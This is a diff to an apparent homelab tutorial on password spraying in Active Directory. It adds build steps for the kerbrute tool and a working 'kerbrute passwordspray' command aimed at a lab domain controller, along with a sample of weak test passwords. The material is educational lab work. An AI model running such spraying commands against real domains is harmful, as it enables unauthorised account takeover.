@@ -66,9 +66,22 @@ Password spraying is a cyberattack in which an attacker tries a small number of 
 <img width="90%" height="90%" alt="image" src="https://github.com/user-attachments/assets/08e2d872-c8de-47eb-ac43-7ed801a71c90" />
 </p>
 
+- I needed to install `Go` for this
+```
+sudo apt update
+sudo apt install git golang -y
+```
+- Then I installed `kerbrute`
+```
+git clone https://github.com/ropnop/kerbrute.git
+cd kerbrute
+go build -o kerbrute
+./kerbrute -h
+```
+
 - Then, I starting spraying the passwords
 ```
-kerbrute passwordspray -d homelab.local --dc 10.10.10.10 users.txt <password>
+./kerbrute passwordspray -d homelab.local --dc 10.10.10.10 users.txt <password>
 ```
 - I tested it with two passwords, `Password01` and `welcome1` and we can see that while the first password did not work, the second one did work for `Alisha`'s account only which is expected
 <p align="center">
